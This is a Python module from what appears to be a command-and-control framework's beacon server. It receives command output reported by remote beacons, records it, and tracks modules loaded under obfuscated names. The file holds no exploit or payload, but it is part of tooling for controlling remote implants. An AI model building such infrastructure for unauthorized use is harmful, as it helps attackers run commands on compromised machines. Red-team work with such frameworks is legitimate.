from http.server import BaseHTTPRequestHandler

from Modules.beacon.beacon_server.utils import process_request_data
from Modules.global_objects import (
    beacon_list,
    command_database,
    command_list,
    logger,
    obfuscation_map,
)
from Modules.utils.ui_manager import RichPrint, log_connection_event


def _deobfuscate_module_name(obf_name: str) -> str:
    """
    Reverse lookup to find the real module name from obfuscated name.

    Args:
        obf_name: The obfuscated module name

    Returns:
        The real module name, or the obfuscated name if not found
    """
    try:
        # Search through obfuscation map for matching obfuscation_name
        for module_name, module_data in obfuscation_map.items():
            if isinstance(module_data, dict):
                if module_data.get("obfuscation_name") == obf_name:
                    return module_name
    except Exception as e:
        logger.debug(f"Error deobfuscating module name '{obf_name}': {e}")
    return obf_name


def handle_command_response(handler: BaseHTTPRequestHandler, match: dict):
    """
    Receives the output from executed commands.
    Args:
        handler (BaseHTTPRequestHandler): The HTTP request handler
        match (dict): Regex match object for the request path
    Returns:
        None
    """
    logger.info(f"Response received from {handler.path}")

    content_len = int(handler.headers.get("Content-Length", 0))
    raw_data = handler.rfile.read(content_len)

    data, error = process_request_data(raw_data)
    if error:
        handler.send_response(400)
        handler.end_headers()
        return

    reports = data.get("reports", [])

    if not reports or not all(
        "command_uuid" in report and "output" in report for report in reports
    ):
        logger.error("Invalid report format received.")
        handler.send_response(400)
        handler.end_headers()
        return

    for report in reports:
        cid = report["command_uuid"]
        output = report["output"]
        command = command_list.get(cid)

        if not command:
            logger.error(f"Command with UUID {cid} not found in command list.")
            continue

        if command_database is not None:
            command_database.update_entry(
                "beacon_commands",
                "executed=?, command_output=?",
                (True, output),
                "command_uuid=?",
                (cid,),
            )
            logger.debug(f"Updated command {cid} status to 'Completed' with output")
        else:
            logger.warning(
                f"Command database not initialized yet, skipping database update for command {cid}"
            )

        command.command_output = output

        # Log to live events panel and terminal
        truncated_output = output[:50] + "..." if len(output) > 50 else output
        log_connection_event(
            "command_output",
            f"{command.command}: {truncated_output}",
            {"command_uuid": cid, "command": command.command, "output": output},
        )
        RichPrint.r_print(
            f"[bright_green]✓[/] Command [bright_cyan]{command.command}[/] completed"
        )

        if command.command == "module":
            command.data = ""

            # Mark module as loaded now that beacon has confirmed it
            # Extract module name from command data and update beacon's loaded_modules
            beacon_uuid = command.beacon_uuid
            beacon = beacon_list.get(beacon_uuid)
            if beacon:
                try:
                    # Get the module name from the command data
                    cmd_data = getattr(command, "command_data", None)
                    if cmd_data and isinstance(cmd_data, dict):
                        obf_module_name = cmd_data.get("name")
                        if obf_module_name:
                            # Deobfuscate the module name to get the real name
                            module_name = _deobfuscate_module_name(obf_module_name)

                            # Check if module is already in the list
                            if module_name not in beacon.loaded_modules:
                                beacon.loaded_modules.append(module_name)
                                logger.info(
                                    f"Module '{module_name}' confirmed loaded on beacon {beacon_uuid}"
                                )

                                # Update the database with the new loaded_modules list
                                if command_database is not None:
                                    try:
                                        command_database.update_entry(
                                            "beacons",
                                            "modules=?",
                                            (str(beacon.loaded_modules),),
                                            "uuid=?",
                                            (beacon_uuid,),
                                        )
                                        logger.debug(
                                            f"Updated beacon {beacon_uuid} loaded_modules in database"
                                        )
                                    except Exception as e:
                                        logger.error(
                                            f"Failed to update beacon loaded_modules in database: {e}"
                                        )
                except Exception as e:
                    logger.error(
                        f"Error updating loaded modules for beacon {beacon_uuid}: {e}"
                    )

    handler.send_response(200)
    handler.end_headers()
